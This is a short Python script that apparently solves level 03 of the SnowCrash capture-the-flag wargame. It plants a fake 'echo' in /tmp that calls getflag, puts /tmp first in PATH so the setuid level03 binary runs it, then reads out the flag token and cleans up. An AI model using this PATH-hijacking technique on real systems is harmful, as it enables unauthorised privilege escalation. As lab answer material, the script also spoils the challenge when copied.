"""LEVEL 03"""

import utils as u
from utils.level_wrapper import level_handler


@level_handler
def solve_level03(_, snow_crash):
    """Direct towards custom instead of built-in command"""

    output = snow_crash.run(
        "echo getflag > /tmp/echo && chmod +x /tmp/echo; \
        ./level03",
        env={"PATH": "/tmp:/usr/bin:/usr/sbin:/bin:/sbin"},
    )
    token = u.misc.parse_token(output.recv())
    snow_crash["rm -f /tmp/echo"]
    return "token", token
